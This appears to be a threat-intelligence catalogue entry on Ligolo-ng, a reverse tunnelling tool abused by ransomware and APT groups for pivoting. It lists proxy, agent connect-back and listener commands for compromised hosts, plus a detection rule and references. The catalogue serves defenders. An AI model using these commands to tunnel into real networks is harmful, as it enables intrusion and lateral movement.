---
Name: Ligolo-ng
Description: Ligolo-ng is a self-hosted, lightweight tunneling tool that establishes a tunnel from a reverse TCP/TLS connection using a userland TUN interface (gVisor network stack), giving transparent Layer-3 access to a target network without a SOCKS proxy or SSH forwarding chain. A proxy runs on the operator side and a small agent runs on the compromised host, so there is no vendor domain to block. It is heavily abused for pivoting and lateral movement, observed with Medusa ransomware, MuddyWater and DoNot Team, among others.
Author: cyberbuff
Created: 2026-09-22
Commands:
    - Command: ./proxy -selfcert
      Description: Starts the operator-controlled Ligolo-ng proxy/listener with a self-signed certificate, waiting for agents to connect back (default TLS listener on 11601).
      Usecase: Standing up the tunnel endpoint that compromised hosts connect back to.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS

    - Command: ./agent -connect <PROXY>:11601 -ignore-cert
      Description: Runs the agent on a compromised host, dialing back to the operator's proxy over TLS (ignoring the self-signed certificate) to establish the reverse tunnel.
      Usecase: Establishing a Layer-3 pivot from inside the target network back to the operator.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS

    - Command: listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
      Description: From the proxy console, binds a listening port on the compromised agent and forwards inbound connections to a chosen address, enabling multi-hop pivoting and reverse port forwarding.
      Usecase: Chaining tunnels through multiple networks or exposing an internal service to the operator.
      Category: Access
      Privileges: User
      OperatingSystem: Windows, Linux, MacOS
Custom_Domain_Supported: True
Full_Path:
    - Path: Downloaded proxy and agent binaries (proxy/proxy.exe on the operator side, agent/agent.exe on the target), executed anywhere on the system.
Detection:
    - Command: "Execution of the ligolo-ng agent or proxy binaries, particularly the agent with -connect <host>:11601 and -ignore-cert arguments, or the proxy with -selfcert/-autocert."
Resources:
    - Link: https://github.com/nicocha30/ligolo-ng
    - Link: https://docs.ligolo.ng/
    - Link: https://www.bleepingcomputer.com/news/security/hackers-fork-open-source-reverse-tunneling-tool-for-persistence/
---
